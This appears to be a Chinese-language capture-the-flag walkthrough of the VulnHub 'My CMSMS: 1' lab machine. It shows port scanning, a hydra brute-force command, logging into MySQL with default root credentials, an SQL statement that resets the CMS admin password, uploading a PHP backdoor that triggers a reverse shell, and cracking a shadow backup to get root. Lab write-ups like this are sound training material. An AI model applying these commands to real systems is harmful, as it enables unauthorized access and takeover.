# My CMSMS: 1

2024-5-27 https://www.vulnhub.com/entry/my-cmsms-1,498/

difficulty: Easy to Intermediate

## IP

192.168.5.30

## Scan

Open Port -> 22,80,3306,33060

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 27219eb53963e91f2cb26bd33a5f317b (RSA)
|   256 bf908aa5d7e5de89e61a36a193401857 (ECDSA)
|_  256 951f329578085045cd8c7c714ad46c1c (ED25519)
80/tcp    open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-generator: CMS Made Simple - Copyright (C) 2004-2020. All rights reserved.
|_http-title: Home - My CMS
3306/tcp  open  mysql   MySQL 8.0.19
|_ssl-date: TLS randomness does not represent time
| mysql-info:
|   Protocol: 10
|   Version: 8.0.19
|   Thread ID: 45
|   Capabilities flags: 65535
|   Some Capabilities: Support41Auth, ConnectWithDatabase, LongColumnFlag, Speaks41ProtocolOld, InteractiveClient, ODBCClient, SupportsTransactions, SupportsLoadDataLocal, SwitchToSSLAfterHandshake, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, LongPassword, IgnoreSigpipes, DontAllowDatabaseTableColumn, FoundRows, SupportsCompression, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: (\x08\x0E\x1DMTIbLM+`C\x1Fd[Gf'2
|_  Auth Plugin Name: mysql_native_password
| ssl-cert: Subject: commonName=MySQL_Server_8.0.19_Auto_Generated_Server_Certificate
| Not valid before: 2020-03-25T09:30:14
|_Not valid after:  2030-03-23T09:30:14
33060/tcp open  mysqlx?
| fingerprint-strings:
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp:
|     Invalid message"
|_    HY000
```

先看看 80 的 web 吧，gobuster 扫描：

```
gobuster -t 64 dir -u http://192.168.5.30/ -k -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -x php,txt,html -e

http://192.168.5.30/index.php            (Status: 200) [Size: 19342]
http://192.168.5.30/modules              (Status: 301) [Size: 314] [--> http://192.168.5.30/modules/]
http://192.168.5.30/uploads              (Status: 301) [Size: 314] [--> http://192.168.5.30/uploads/]
http://192.168.5.30/doc                  (Status: 301) [Size: 310] [--> http://192.168.5.30/doc/]
http://192.168.5.30/admin                (Status: 301) [Size: 312] [--> http://192.168.5.30/admin/]
http://192.168.5.30/assets               (Status: 301) [Size: 313] [--> http://192.168.5.30/assets/]
http://192.168.5.30/lib                  (Status: 301) [Size: 310] [--> http://192.168.5.30/lib/]
http://192.168.5.30/config.php           (Status: 200) [Size: 0]
http://192.168.5.30/tmp                  (Status: 301) [Size: 310] [--> http://192.168.5.30/tmp/]
http://192.168.5.30/phpmyadmin           (Status: 401) [Size: 459]
http://192.168.5.30/phpinfo.php          (Status: 200) [Size: 90101]
http://192.168.5.30/server-status        (Status: 403) [Size: 277]
```

访问首页，发现 This site is powered by CMS Made Simple version 2.2.13。看看这个 CMS 是否存在漏洞，找到的一些 exp 利用都是先需要认证用户，看样子，需要先得到一个系统的用户凭据。

http://192.168.5.30/admin/login.php 访问登陆页面，先尝试些弱密码。没有找到，尝试用 hydra 进行爆破：

```
hydra -t 20 -l admin -P ~/tools/dict/rockyou.txt 192.168.5.30 -f http-post-form "/admin/login.php:username=^USER^&password=^PASS^&loginsubmit=Submit:F=User name or password incorrect"
```

没有爆到。

还是看看 mysql 的吧，看看能不能从数据库中获得 CMS 的用户名和密码，尝试弱密码登陆最后发现，root:root 可以登陆到数据库。

找到管理员的密码：

```
MySQL [cmsms_db]> select * from cms_users;
+---------+----------+----------------------------------+--------------+------------+-----------+-------------------+--------+---------------------+---------------------+
| user_id | username | password                         | admin_access | first_name | last_name | email             | active | create_date         | modified_date       |
+---------+----------+----------------------------------+--------------+------------+-----------+-------------------+--------+---------------------+---------------------+
|       1 | admin    | fb67c6d24e756229aab021cea7605fb3 |            1 |            |           | admin@mycms.local |      1 | 2020-03-25 09:38:46 | 2020-03-26 10:49:17 |
+---------+----------+----------------------------------+--------------+------------+-----------+-------------------+--------+---------------------+---------------------+
```

找不到 password 哈希对应的明文密码。

只有用新密码重置这个哈希了，然后就能登陆了。

经过寻找资料，找到了这个 CMS 的加密方式：

```
update cms_users set password = (select md5(CONCAT(IFNULL((SELECT sitepref_value FROM cms_siteprefs WHERE sitepref_name = 'sitemask'),''),'123'))) where username = 'admin';
```

将 admin 的密码改成 123. 便可以登陆到后台系统中。

https://www.exploit-db.com/exploits/48742 这里存在文件上传的 RCE，按照操作步骤上传后门代码：

```
- Create .phtml or .ptar file with malicious PHP payload;
- Upload .phtml or .ptar file in the 'File Manager' module;
- Click on the uploaded file to perform remote code execution.

这里是上传点：
http://192.168.5.30/admin/moduleinterface.php?mact=FileManager,m1_,defaultadmin,0&__c=074c482351e60ceb54e
```

kali 上监听 8888 端口，访问上传的后门文件，触发反弹 shell：

```
curl http://192.168.5.30/uploads/images/8888.phtml
```

得到了反弹的 shell，先升级 tty：

```
www-data@mycmsms:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data),1001(nagios),1002(nagcmd)
```

开始系统枚举，/home 目录下发现 armour 用户。

发现非默认的 suid 程序 /home/armour/binary.sh 查看内容：

```
www-data@mycmsms:/home/armour$ strings binary.sh
#!/bin/bash
echo "Usage: binary.sh COMMAND"
echo `$1`
```

可以执行传入的参数，但是不能切换到其他用户。

发现备份文件 /var/backups/shadow.bak:

```
root:$6$iJMQ9Yh/FREEfPRO$PkfB7e4jnXBppAd4QJ1l9e068Buung0nhx0i1E6p7AzeYBE6O6BqHme82yVAWxvy.TeP1IcOJ6PB.MTd2CRKW/
armour:$6$lKH6hAvjcR1pMBbw$tHxI4VfjoB3JEyPsd4tHzj.IqObn4kRCgkb/rfHRBbo76X2rp9yT93YaSQuvQ9Qd3gT1YJaGxKyb0J3fNjkGb0
```

尝试用 john 进行解密，得到了 root 的密码:Password

su 切换到 root 用户，得到最终的 falg：

```
root@mycmsms:~# cat proof.txt
   ##############################################################################################
   #                                      Armour Infosec                                        #
   #                         --------- www.armourinfosec.com ------------                       #
   #                                             My CMSMS                                       #
   #                               Designed By  :- Pankaj Verma                                 #
   #                               Twitter      :- @_p4nk4j                                     #
   ##############################################################################################


			          **Thanks for Trying this Box**


					Here's Your Flag


				b315ed055787c0994d8a7b08b2be9244
```
